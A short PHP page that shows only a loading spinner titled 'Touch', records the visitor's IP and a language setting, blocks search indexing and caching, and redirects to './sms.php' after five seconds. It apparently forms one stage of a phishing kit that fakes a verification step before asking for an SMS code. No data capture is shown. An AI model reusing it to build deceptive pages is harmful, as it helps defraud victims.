<?php 
    session_start();
    function get_client_ips() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
    if(isset($_GET['lang'])){
        $_SESSION["lang"] = $_GET['lang'];
    }    
?>
<!DOCTYPE html>
<html style="height: 100%; width: 100%; display: flex; align-items: center; justify-content: center;">
    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./assets/css/helpers.css">
        <link rel="stylesheet" href="./assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="./assets/imgs/ff.ico" />

        <title>Touch</title>
    </head>
    <body style="height: 100%; width: 100%; display: flex; align-items: center; justify-content: center;">


        <div class="loader">
            <div class="spinner-border"></div>
        </div>


        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./assets/js/js.js"></script>
        
        <script>
            setTimeout(function () {
                window.location.href= './sms.php';
            },5000); // 1000 = 1s               
        </script>                     
    </body>
</html>